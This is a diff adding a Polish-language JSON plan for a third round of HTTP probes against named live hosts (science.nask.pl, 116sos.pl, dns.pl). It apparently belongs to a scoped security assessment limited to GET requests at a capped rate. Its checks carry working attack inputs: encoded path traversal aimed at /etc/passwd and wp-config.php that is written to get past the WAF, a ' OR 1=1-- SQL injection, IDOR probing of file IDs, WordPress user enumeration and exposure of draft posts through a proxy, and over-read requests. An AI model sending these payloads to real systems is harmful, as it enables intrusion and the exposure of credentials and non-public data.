@@ -1,0 +1,167 @@
+{
+  "_opis": "Runda 3: science.nask.pl/api/downloadFile — parametr to `fileId` (potwierdzone: fileId=1 -> \"File not found\", file_id/id -> \"Invalid file id\"). Teraz: czy istniejące ID zwraca plik (IDOR, poz. 8.9) i czy ID przyjmuje ścieżki (LFI, poz. 15). Plus kontrakty /api/search i WP-REST przez proxy media.",
+  "_zasady": "Zakres: hosty z scope.example.json. Tempo: 2 req/s. Wyłącznie GET, bez ciał, bez logowania.",
+  "checks": [
+    {
+      "id": "s3-dl-18864",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/downloadFile?fileId=18864",
+      "why": "18864 to realne ID załącznika WP (z /api/search). Jeśli zwraca plik, mamy działający kontrakt pobierania; jeśli 500 — błąd serwera przy istniejącym ID.",
+      "class": "8.9"
+    },
+    {
+      "id": "s3-dl-13231",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/downloadFile?fileId=13231",
+      "why": "Drugie realne ID (13231) — powtarzalność zachowania 500/200.",
+      "class": "8.9"
+    },
+    {
+      "id": "s3-dl-18881",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/downloadFile?fileId=18881",
+      "why": "18881 to ID wpisu (news), nie załącznika — sprawdza, czy fileId klepie po ID postów (wtedy ujawni treści niepubliczne).",
+      "class": "8.9"
+    },
+    {
+      "id": "s3-dl-999999",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/downloadFile?fileId=999999",
+      "why": "Baseline nieistniejącego ID — odróżnia 404 od 500 przy istniejącym.",
+      "class": "info"
+    },
+    {
+      "id": "s3-dl-traversal",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/downloadFile?fileId=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+      "why": "fileId jako ścieżka: LFI (poz. 15). Kodowane, bo surowe '/' ucina WAF.",
+      "class": "15"
+    },
+    {
+      "id": "s3-dl-wpconfig",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/downloadFile?fileId=..%2F..%2Fwp-config.php",
+      "why": "Cel LFI o najwyższej wartości: konfiguracja WP (dane wrażliwe, poz. 15/3).",
+      "class": "15"
+    },
+    {
+      "id": "s3-search-sqli",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/search?query=%27%20OR%201%3D1--%20",
+      "why": "Kontrakt `query` potwierdzony. OR 1=1: czy zwraca wszystko (SQLi, poz. 4) czy pustkę.",
+      "class": "4"
+    },
+    {
+      "id": "s3-search-quote",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/search?query=%27",
+      "why": "Sam cudzysłów: błąd SQL/500 vs normalna pusta lista.",
+      "class": "4"
+    },
+    {
+      "id": "s3-search-empty",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/search?query=zzzqqqxxx",
+      "why": "Baseline pustego wyniku dla porównania z OR 1=1.",
+      "class": "info"
+    },
+    {
+      "id": "s3-media-wpjson-users",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/media/wp-json/wp/v2/users?per_page=100",
+      "why": "Proxy /api/media/ przepuszcza WordPressa — czy REST API jest publiczne (enum kont, poz. wykluczone same w sobie, ale daje login do dalszych testów).",
+      "class": "info"
+    },
+    {
+      "id": "s3-media-wpjson-posts",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/media/wp-json/wp/v2/posts?per_page=100&status=draft",
+      "why": "Czy przez proxy widać wersje robocze (dane niepubliczne, poz. 3).",
+      "class": "3"
+    },
+    {
+      "id": "116-centres-limit",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/centres-search?q=a&limit=5000",
+      "why": "Over-read przez limit: czy API respektuje limit klienta (poz. 12.2).",
+      "class": "12.2"
+    },
+    {
+      "id": "116-centres-page",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/centres-search?q=a&page=1&per_page=5000",
+      "why": "Alternatywna nazwa paginacji.",
+      "class": "12.2"
+    },
+    {
+      "id": "116-cookie-hash-cookie",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/fetch-cookie-hash",
+      "headers": { "Cookie": "probe=arena-probe" },
+      "why": "Czy hash zależy od ciasteczka (sesja) czy jest stały (cache-buster). Porównanie z poprzednim, bez Cookie.",
+      "class": "11.1"
+    },
+    {
+      "id": "116-announcements-limit",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/announcements?limit=1000",
+      "why": "Over-read ogłoszeń.",
+      "class": "12.2"
+    },
+    {
+      "id": "dns-count-deleted",
+      "host": "dns.pl",
+      "method": "GET",
+      "path": "/api/count-deleted-domains",
+      "why": "Żywy endpoint z bundle'a —kształt odpowiedzi, czy nie parsuje parametru.",
+      "class": "info"
+    },
+    {
+      "id": "dns-zone-stats",
+      "host": "dns.pl",
+      "method": "GET",
+      "path": "/api/zone-stats",
+      "why": "Statystyki strefy: parametry (zone, date) mogą iść do zapytania.",
+      "class": "info"
+    },
+    {
+      "id": "dns-funny-name",
+      "host": "dns.pl",
+      "method": "GET",
+      "path": "/api/funny-name/",
+      "why": "Generator nazw — sprawdzić refleksję parametru (XSS poz. 8).",
+      "class": "8"
+    },
+    {
+      "id": "dns-whois-xml-name",
+      "host": "dns.pl",
+      "method": "GET",
+      "path": "/api/who-is-xml/?name=nask.pl",
+      "why": "Jeszcze jeden wariant kontraktu whois (poprzednio /nask.pl i ?domain= dały 404).",
+      "class": "20"
+    },
+    {
+      "id": "dns-domain-browser-limit",
+      "host": "dns.pl",
+      "method": "GET",
+      "path": "/api/domain-browser/?page=1&limit=5000",
+      "why": "Over-read listy domen (poz. 12.2).",
+      "class": "12.2"
+    }
+  ]
+}
